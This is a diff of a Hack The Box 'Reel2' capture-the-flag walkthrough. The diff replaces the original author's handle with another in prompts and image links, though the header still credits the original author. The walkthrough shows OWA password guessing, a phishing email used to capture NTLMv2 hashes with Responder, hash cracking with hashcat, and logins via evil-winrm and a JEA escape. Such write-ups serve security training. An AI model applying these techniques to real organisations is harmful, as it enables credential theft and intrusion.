@@ -9,6 +9,7 @@ avatar: assets/htb/reel2.png
 source: https://github.com/zweilosec/htb-writeups (MIT)
 htb_url: https://app.hackthebox.com/machines/Reel2
 ---
+
 ## HTB - Reel2
 
 ### Overview
@@ -58,7 +59,7 @@ I started my enumeration with an nmap scan of `<YOUR_IP>`. The options I regular
 | `-oA $name` | Saves all three formats \(standard, greppable, and XML\) of output with a filename of `$name` |
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/reel2]
+┌──(kac0㉿kali)-[~/htb/reel2]
 └─$ nmap -sCV -n -p- -Pn -v -oA reel2 <YOUR_IP>                                               130 ⨯
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-15 12:16 EST
@@ -170,37 +171,37 @@ From the nmap scan I also saw a DNS domain name `Reel2.htb.local` in the port 44
 
 ### Port 80 - HTTP
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/1-80-forbidden.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1-80-forbidden.png)
 
 I opened a web browser and navigated to `http://reel2.htb.local`, but this simply led to a 403 - Forbidden error page.  I also ran a dirbuster scan in the background but found nothing useful.
 
 ### Port 8080 - HTTP
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/1-8080-wallstant.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1-8080-wallstant.png)
 
 Trying the same for port 8080 led to a login page for something called "WallStant".  It looked like some kind of social media site.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/1-8080-wallstant-signup.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1-8080-wallstant-signup.png)
 
 I created an account after clicking on the "Sign Up" button.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/1-8080-wallstant-in.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1-8080-wallstant-in.png)
 
 After logging in I found myself in something that looked like an old version of Facebook.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/1-8080-wallstant-edit.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1-8080-wallstant-edit.png)
 
 I saw a link for editing my profile. I was hoping for the ability to upload a profile picture, but unfortunately it did not seem to actually be an option.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/1-8080-wallstant-photo.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1-8080-wallstant-photo.png)
 
 I found the option I was looking for on my 'test' user's profile page.  There was an upload button for changing the profile and banner images.  First I tested it by uploading one of my enumeration screenshots.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/1-8080-wallstant-nophoto.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1-8080-wallstant-nophoto.png)
 
 After validating that I could indeed upload files, I tried to upload a PHP code exec script \(though I wasn't  sure if PHP even ran here...\) but the file had to be an image.  I was able to upload a photo, so next I loaded Burp to see if I could fool it into loading code.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/2-burp-php.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/2-burp-php.png)
 
 I was able to upload my disguised PHP file, but I couldn't get code execution.  I did notice that the response contained the `X-Powered-By` header that told me that it was using PHP/7.2.32, so I checked to see if I could find any vulnerabilities associated with that version.
 
@@ -210,11 +211,11 @@ I was able to upload my disguised PHP file, but I couldn't get code execution.  
 
 I found a number of vulnerabilities associated with this version, including one that pointed to a version of curl that is included that could lead to code execution using the `-J` flag is used to overwrite a local file
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/2-php-vuln.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/2-php-vuln.png)
 
 Unfortunately, after reading the HackerOne report it seemed as if it was not useful in this case unless I could somehow make requests from the machine using curl \(not libcurl\).
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/1-8080-wallstant-3posts.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1-8080-wallstant-3posts.png)
 
 Back on the Wallstant page there was a "Trending Posts" box that had three potential usernames \(and I saw that one of my XXS tests was trending!\). I wondered what a 'fika\` was, so I looked it up.
 
@@ -224,7 +225,7 @@ Back on the Wallstant page there was a "Trending Posts" box that had three poten
 
 I wrote it down as a potential partial password and continued on.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/1-8080-wallstant-users.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1-8080-wallstant-users.png)
 
 The other trending Pages tab contained more potential usernames.
 
@@ -239,46 +240,46 @@ The other trending Pages tab contained more potential usernames.
 -- PHP Version: 7.3.9
 ```
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/1-8080-database.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1-8080-database.png)
 
 Dirbuster found a `/_database` folder which contained a `wallstant.sql` SQL database.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/1-8080-database-sn.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1-8080-database-sn.png)
 
 There was not much useful information other than version numbers.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/1-8080-wallstant-report1.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1-8080-wallstant-report1.png)
 
 Report a problem? Sure I was having a problem with accessing your machine, could you let me in?
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/1-8080-wallstant-report.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1-8080-wallstant-report.png)
 
 I wasn't able to get this to connect back to my machine, though. After testing for XSS, SQLi, and doing other tests in each of the input fields, there did not seem to be much else I could do here. I decided to see if there was anything useful on port 443.
 
 ### Port 443 - HTTPS
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/3-443-cert.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/3-443-cert.png)
 
 I checked out the certificate, but other than the domain name I had already discovered there was no useful information.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/3-443-iis.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/3-443-iis.png)
 
 The HTTPS port only led to a blank IIS Welcome page. I loaded Dirbuster again to see if there was anything other than the index page.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/3-dirbuster-owa.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/3-dirbuster-owa.png)
 
 Dirbuster quickly returned a few folders, including `public` and `owa`. Both sounded interesting, so I loaded public first.
 
 ### Getting OWA credentials
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/3-443-owa.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/3-443-owa.png)
 
 Navigating to `https://Reels.htb.local/public` redirected to an Outlook Web Application login page. Since I had a list of names to make usernames from, I decided to try to brute force the login. Searching for OWA brute force led to a tool by `byt3bl33d3r`. 
 
 * [https://github.com/byt3bl33d3r/SprayingToolkit](https://github.com/byt3bl33d3r/SprayingToolkit)
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/reel2]
+┌──(kac0㉿kali)-[~/htb/reel2]
 └─$ ~/SprayingToolkit/atomizer.py owa https://Reel2.htb.local/owa ~/rockyou_utf8.txt usernames --threads 20
 [*] Using 'https://reel2.htb.local/owa' as URL
 [-] Error parsing internal domain name using OWA. This usually means OWA is being hosted on-prem or the target has a hybrid AD deployment
@@ -296,33 +297,33 @@ The first time I ran the tool it gave me a very helpful error message that expla
 > * Autodiscover redirect URL for redirection: [http://autodiscover.contoso.com/autodiscover/autodiscover.xml](http://autodiscover.contoso.com/autodiscover/autodiscover.xml)
 > * Search for DNS SRV record
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/4-owa-autodiscovery.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/4-owa-autodiscovery.png)
 
 I tried to access `autodiscover/Autodiscover.xml`, but I kept having errors and was required to login to access it.  This also prevented the OWA brute force tool from enumerating the machine.  
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/4-owa-broken.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/4-owa-broken.png)
 
 The night I was doing this machine I kept getting crashes from the OWA web app and all sorts of other problems, including the portal being extremely slow.  I am not sure if this is normal on this machine or if it was being overly taxed by other users.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/4-owa-broken2.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/4-owa-broken2.png)
 
 These errors made me rethink brute-forcing the portal.  Since it seemed like other users were also pounding the server, I reset the machine and looked around a bit more to see if I had missed something.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/1-8080-wallstant-fika.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1-8080-wallstant-fika.png)
 
 I checked each profile page for clues for the password to log in.  I tried combinations of fika + 2020 etc.  For the username I tried different combinations of username, first name, and last name.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/1-8080-wallstant-svenson.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1-8080-wallstant-svenson.png)
 
 Next I tried combinations of summer + 2020.  
 
 ### The OWA Portal
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/4-owa-login.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/4-owa-login.png)
 
 After a lot of tries, I was able to log into the OWA with the credentials `HTB\s.svenson:Summer2020`. 
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/5-owa-loggedin.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/5-owa-loggedin.png)
 
 The first thing I noticed was that the page was in Swedish, but since I have used OWA before it was not much of a problem. There was no mail, notes, contacts, or anything to look through.
 
@@ -331,22 +332,22 @@ The first thing I noticed was that the page was in Swedish, but since I have use
 
 After searching for awhile for ways to steal information through Outlook, I found a few articles that explained how to get NTLMv2 hashes by sending a link to the attackers box and having the email simply viewed in the Preview Pane.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/5-owa-addressbook.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/5-owa-addressbook.png)
 
 I opened the address book, and saw a long list of addresses available. I selected all them and clicked on the button to send a new email. 
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/5-owa-popup.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/5-owa-popup.png)
 
 I received an error from Firefox saying popups had been blocked, but clicking "Ja" \(Yes\) in the dialog box allowed the new mail window to open.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/5-owa-phish2.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/5-owa-phish2.png)
 
 I used Google translate to send an email inviting everyone to check out the new NAS link, which was a link to my machine. I tried sending as both a web link and as an SMB share just in case.  After that I fired up `Responder` to see what I could catch.
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/reel2]
+┌──(kac0㉿kali)-[~/htb/reel2]
 └─$ sudo responder -I tun0                                                                       255 ⨯
-[sudo] password for zweilos: 
+[sudo] password for kac0: 
                                          __
   .----.-----.-----.-----.-----.-----.--|  |.-----.----.
   |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
@@ -407,7 +408,7 @@ I used Google translate to send an email inviting everyone to check out the new 
 After a short time I got a hit, with the NTLMv2 hash for the user `k.svensson`.
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/reel2]
+┌──(kac0㉿kali)-[~/htb/reel2]
 └─$ hashcat --help | grep -i 'NTLM'
    5500 | NetNTLMv1 / NetNTLMv1+ESS                        | Network Protocols
    5600 | NetNTLMv2                                        | Network Protocols
@@ -417,7 +418,7 @@ After a short time I got a hit, with the NTLMv2 hash for the user `k.svensson`.
 Using hashcat's help I was able to identify the type id of the hash as 5600.
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/reel2]
+┌──(kac0㉿kali)-[~/htb/reel2]
 └─$ hashcat -O -D1,2 -a0 -m5600 hash /usr/share/wordlists/rockyou.txt                            255 ⨯
 hashcat (v6.1.1) starting...
 
@@ -476,7 +477,7 @@ I was able to crack the hash in just a few seconds. `k.svensson`'s password was 
 ## Initial Foothold
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/reel2]
+┌──(kac0㉿kali)-[~/htb/reel2]
 └─$ evil-winrm -u k.svensson -p kittycat1 -i <YOUR_IP>                                          1 ⨯
 
 Evil-WinRM shell v2.3
@@ -496,7 +497,7 @@ I was able to connect with `Evil-WinRM` using the credentials for `k.svensson:ki
 * [https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/enter-pssession?view=powershell-7.1](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/enter-pssession?view=powershell-7.1)
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/reel2]
+┌──(kac0㉿kali)-[~/htb/reel2]
 └─$ pwsh
 PowerShell 7.0.0
 Copyright (c) Microsoft Corporation. All rights reserved.
@@ -508,13 +509,13 @@ Type 'help' to get help.
    Upgrade now, or check out the release page at:       
      https://aka.ms/PowerShell-Release?tag=v7.1.2       
 
-PS /home/zweilos/htb/reel2> $newSession = New-PSSession -ComputerName <YOUR_IP> -Credential HTB\k.svensson -Authentication Negotiate                                                                       
+PS /home/kac0/htb/reel2> $newSession = New-PSSession -ComputerName <YOUR_IP> -Credential HTB\k.svensson -Authentication Negotiate                                                                       
 
 PowerShell credential request
 Enter your credentials.                                                                                
 Password for user HTB\k.svensson: *********
 
-PS /home/zweilos/htb/reel2> Enter-PSSession $newSession
+PS /home/kac0/htb/reel2> Enter-PSSession $newSession
 ```
 
 I was able to login after using `pwsh` and PowerShell remoting.
@@ -659,7 +660,7 @@ d-----        2/12/2021   5:12 PM                WinDirStatPortable
 -ar---        2/15/2021  11:33 PM             34 user.txt
 
 [<YOUR_IP>]: P> .{type user.txt}
-88fe****20de
+88fe************************20de
 ```
 
 On `k.svensson`'s Desktop I found the `user.txt` proof file.
@@ -932,7 +933,7 @@ In order to pass both the username and password into the `New-PSSession` cmdlet,
 ### Shell as `jea_test_account`
 
 ```bash
-┌──(zweilos㉿kali)-[~/htb/reel2]
+┌──(kac0㉿kali)-[~/htb/reel2]
 └─$ pwsh                       
 PowerShell 7.0.0
 Copyright (c) Microsoft Corporation. All rights reserved.
@@ -944,13 +945,13 @@ Type 'help' to get help.
    Upgrade now, or check out the release page at:       
      https://aka.ms/PowerShell-Release?tag=v7.1.2       
 
-PS /home/zweilos/htb/reel2> $user = "jea_test_account"
-PS /home/zweilos/htb/reel2> $pass = ConvertTo-SecureString "Ab!Q@vcg^%@#1" -AsPlainText 
-PS /home/zweilos/htb/reel2> $creds = new-object -typename System.Management.Automation.PSCredential -argumentlist ($user, $pass)                    
-PS /home/zweilos/htb/reel2> $jeaSession = New-PSSession <YOUR_IP> -Credential $creds -Authentication Negotiate
+PS /home/kac0/htb/reel2> $user = "jea_test_account"
+PS /home/kac0/htb/reel2> $pass = ConvertTo-SecureString "Ab!Q@vcg^%@#1" -AsPlainText 
+PS /home/kac0/htb/reel2> $creds = new-object -typename System.Management.Automation.PSCredential -argumentlist ($user, $pass)                    
+PS /home/kac0/htb/reel2> $jeaSession = New-PSSession <YOUR_IP> -Credential $creds -Authentication Negotiate
 New-PSSession: [<YOUR_IP>] Connecting to remote server <YOUR_IP> failed with the following error message : ERROR_ACCESS_DENIED: Access is denied.  For more information, see the about_Remote_Troubleshooting Help topic.                                                                                      
-PS /home/zweilos/htb/reel2> $jeaSession = New-PSSession <YOUR_IP> -Credential $creds -Authentication Negotiate -ConfigurationName "jea_test_account"                                                       
-PS /home/zweilos/htb/reel2> Enter-PSSession $jeaSession
+PS /home/kac0/htb/reel2> $jeaSession = New-PSSession <YOUR_IP> -Credential $creds -Authentication Negotiate -ConfigurationName "jea_test_account"                                                       
+PS /home/kac0/htb/reel2> Enter-PSSession $jeaSession
 ```
 
 After creating an object with the credentials and specifying the connection with the configuration name, I was able to connect.
@@ -1196,7 +1197,7 @@ Instead, I created a new folder inside `C:\ProgramData\` called `\Desk` which li
 
 ```text
 [<YOUR_IP>]: PS>Check-File C:\ProgramData\Desk\Desktop\root.txt                                     
-e145****dbba
+e145************************dbba
 ```
 
 I was then able to use `Check-File` to read the contents of the `root.txt` by referencing the linked version inside `C:\ProgramData\Desk\Desktop\`.  
@@ -1208,5 +1209,5 @@ After going through all of the trouble to create a link to the folders, I realiz
 ```text
 [<YOUR_IP>]: PS>Check-File C:\ProgramData\..\Users\Administrator\Desktop\root.txt
 
-e145****dbba
+e145************************dbba
 ```
